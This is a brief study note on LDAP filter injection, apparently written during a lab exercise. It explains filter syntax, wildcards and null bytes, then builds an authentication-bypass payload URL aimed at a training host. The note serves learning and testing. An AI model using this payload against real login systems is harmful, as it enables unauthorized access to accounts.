---
tags: ldap

---
The most common injection type let’s use inject into a filter.

First, here is the usual syntax to retrieve a user:

```ldap
(cn=[INPUT])
```

Here is how you would add some boolean logic: 

OR: `(|(cn=[INPUT1])(cn=[INPUT2]))`
AND: `(&(cn=[INPUT1])(userPassword=[INPUT2]))`

```ad-note
We can see that the logic is before the filter, so it’s not always possible to insert new logic.
```

`*`, wildcard, match several things

`%00`, nullbytes: ignore the rest of the filter

### Example:

- `username=hacker&password=hacker` we get authenticated (this is the normal request).
- `username=hack*&password=hacker` we get authenticated (the wildcard matches the same value).
- `username=hacker&password=hac*` we don't get authenticated (the password may likely be hashed).

Let’s use wildcard to bypass auth:

Based on our previous tests, we can deduce that the filter might look something like:
```ldap
(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))
```

This usually only allows you to bypass security checks.

So what do we do:

- The end of the current filter using hacker).
- An always-true condition ((cn=*) for example)
- A ) to keep a valid syntax and close the first (.
- A NULL BYTE (%00) to get rid of the end of the filter.

This is how a final payload might look like:

```url
http://ptl-149f4d75-6e8ca3b1.libcurl.so/?name=a*)(cn=*))%00&password=admin
```